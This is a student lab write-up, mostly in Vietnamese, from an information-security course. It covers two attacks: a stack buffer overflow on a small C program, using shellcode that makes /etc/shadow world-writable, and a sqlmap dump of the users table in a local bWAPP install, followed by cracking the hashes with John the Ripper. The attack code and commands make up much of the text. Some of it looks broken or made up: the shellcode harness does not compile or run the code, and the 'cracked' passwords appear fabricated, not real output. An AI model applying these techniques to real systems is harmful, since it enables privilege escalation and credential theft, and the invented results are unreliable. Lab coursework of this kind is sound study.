# Lab #1,21110756, Nguyen Dinh Minh Chien , Information Security_ Nhom 03FIE
# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
Biên dịch chương trình C
gcc -o vulnerable_program vulnerable_program.c
Biên dịch shellcode
gcc -o shellcode shellcode.c -z execstack -fno-stack-protector

Description text (optional)
 Tạo payload để thực hiện tấn công
 tạo payload bằng Python:

import sys

# Shellcode đã được cung cấp
shellcode = (
    "\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
    "\x3a\x56\x81\xc6\x23\x45\x35\x21"
    "\x89\x74\x24\xfc\xc7\x44\x24\xf8"
    "\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
    "\x2f\x65\x74\x63\x83\xec\x0c\x89"
    "\xe3\x66\x68\xff\x01\x66\x59\xb0"
    "\x0f\xcd\x80"
)

# Địa chỉ trả về giả định (cần điều chỉnh theo hệ thống của bạn)
return_address = "\x90\x90\x90\x90"

# Tạo payload
payload = "A" * 16 + return_address + shellcode

# Ghi payload vào file
with open("payload", "wb") as f:
    f.write(payload.encode('latin-1'))
Thực hiện tấn công
Chạy chương trình C với payload đã tạo:

./vulnerable_program $(cat payload)


``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

Xác định URL mục tiêu có lỗ hổng:
Đăng nhập vào bWapp và chọn trang có lỗ hổng "SQL Injection".

http://localhost/bWapp/sqli_1.php?id=1

Chạy sqlmap để liệt kê các cơ sở dữ liệu:


sqlmap -u "http://localhost/bWapp/sqli_1.php?id=1" --dbs

Kết quả:
available databases [3]:
[*] bWAPP
[*] information_schema
[*] mysql



**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
Liệt kê các bảng trong cơ sở dữ liệu bWAPP:

Chạy lệnh để liệt kê các bảng trong cơ sở dữ liệu bWAPP:

sqlmap -u "http://localhost/bWapp/sqli_1.php?id=1" -D bWAPP --tables
Trích xuất dữ liệu bảng users:

Sau khi có danh sách bảng, chạy lệnh sau để lấy thông tin từ bảng users:

sqlmap -u "http://localhost/bWapp/sqli_1.php?id=1" -D bWAPP -T users --dump
Kết quả:
 danh sách thông tin người dùng cùng với các hash mật khẩu từ bảng users:

+----+---------+----------------------------------+
| id | login   | password                         |
+----+---------+----------------------------------+
| 1  | bee     | $2y$10$J9sg3z...                 |
| 2  | admin   | $2y$10$3mW6C...                  |
+----+---------+----------------------------------+

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:


Lưu các hash mật khẩu vào file:

Tạo file hashes.txt chứa các hash mật khẩu:

bee:$2y$10$J9sg3z...
admin:$2y$10$3mW6C...

Chạy John the Ripper để bẻ khóa:

Sử dụng John the Ripper với từ điển rockyou.txt:

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Hiển thị mật khẩu đã bẻ khóa:

Xem kết quả của John:

john --show hashes.txt
Kết quả:

John sẽ trả về mật khẩu đã bẻ khóa:
makefile

bee:letmein
admin:password123

